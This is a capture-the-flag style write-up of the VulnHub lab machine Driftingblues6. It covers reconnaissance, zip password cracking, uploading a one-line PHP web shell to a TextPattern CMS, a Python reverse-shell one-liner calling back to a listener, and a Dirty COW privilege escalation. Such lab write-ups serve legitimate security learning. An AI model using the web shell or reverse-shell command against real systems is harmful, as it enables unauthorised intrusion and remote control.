---
layout: default
title : muzec - Driftingblues6 Writeup
---

### Scanning With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -p- -oA nmap <Target-IP>```

```

┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/drift]
└─$ cat nmap.nmap
# Nmap 7.91 scan initiated Mon Jul 12 10:13:15 2021 as: nmap -sC -sV -p- -oA nmap 172.16.139.215
Nmap scan report for 172.16.139.215
Host is up (0.00042s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: driftingblues

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 12 10:13:25 2021 -- 1 IP address (1 host up) scanned in 9.27 seconds
```

We have only one port open so let start digging without wasting a time on it.

![image](https://user-images.githubusercontent.com/69868171/135548967-78162fc0-7dd3-4bd5-a94e-cd241f4901af.png)

Should be easy let check the `robots.txt` first.

![image](https://user-images.githubusercontent.com/69868171/135549175-59c04b25-1b0c-441c-acf3-971231ac5cdd.png)

We have a path also a hint to add extension to our directory brute forcing.


![image](https://user-images.githubusercontent.com/69868171/135549405-236614d1-1cf5-405d-9d63-4ba7511f98e4.png)

Now let brute force some directory.

![image](https://user-images.githubusercontent.com/69868171/135549524-28f34a58-101b-4575-9c10-70a77a49b987.png)

We have a zip file and seems it protected with password let try to crack it using `zip2john` .

![image](https://user-images.githubusercontent.com/69868171/135549658-ba44b3b8-9e50-4259-8419-d2d3f3b23629.png)

Now let unzip the file with the password.

![image](https://user-images.githubusercontent.com/69868171/135549775-76ef058a-6e5f-4d4c-910a-34e01fbfad0e.png)

Now let access the path with the credentials we just obtained.

![image](https://user-images.githubusercontent.com/69868171/135549868-298353c6-b660-42a8-9438-c42db6caff2f.png)

We are in and we have a version of the TextPattern CMS confirming RCE Exploit.

![image](https://user-images.githubusercontent.com/69868171/135550060-08ce6b78-ae36-4325-b136-bad17100f543.png)

But let try doing it manually.

![image](https://user-images.githubusercontent.com/69868171/135550139-1febbab1-aacc-4ffd-82e1-4920aa17e6a7.png)

Click On Files.

![image](https://user-images.githubusercontent.com/69868171/135550208-9938269a-8bdb-4366-930b-028f5a5bef8c.png)

Now our PHP code save in a file with the extension PHP.

```
<?php system($_GET['cmd']) ?>
```

Now let upload it.

![image](https://user-images.githubusercontent.com/69868171/135550407-6e4cbc0b-f55b-47a3-a9fa-80ad8e622082.png)

Time to access it and get Remote Code Execution.

![image](https://user-images.githubusercontent.com/69868171/135550551-22dc39cb-97d8-4bfe-a694-51b756eff797.png)

![image](https://user-images.githubusercontent.com/69868171/135550626-1159c33e-d561-4c26-bcc1-b11863186a74.png)

Now getting a reverse shell back to our terminal.

![image](https://user-images.githubusercontent.com/69868171/135550725-47fe7256-59f0-4194-a9b5-a4328fe723ae.png)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We Have shell let spawn a TTY shell.

![image](https://user-images.githubusercontent.com/69868171/135550828-5e49d70c-9eca-4e3d-b305-4725fde77383.png)

### Privilege Escalation

Kernal version and we notice it running an old version.

![image](https://user-images.githubusercontent.com/69868171/135551013-fca59bc9-fe1a-485f-a78a-d84c638b16bf.png)

Checking Exploit-DB and i found an exploit 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method).

![image](https://user-images.githubusercontent.com/69868171/135551155-51c5e528-e954-4c90-aad3-952ee51a6783.png)

Now let exploit it.

![image](https://user-images.githubusercontent.com/69868171/135551576-64d1d8b3-76d3-4e2c-acf1-3203dbc9ac09.png)

Transfer exploit to target and compile and running the exploit we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
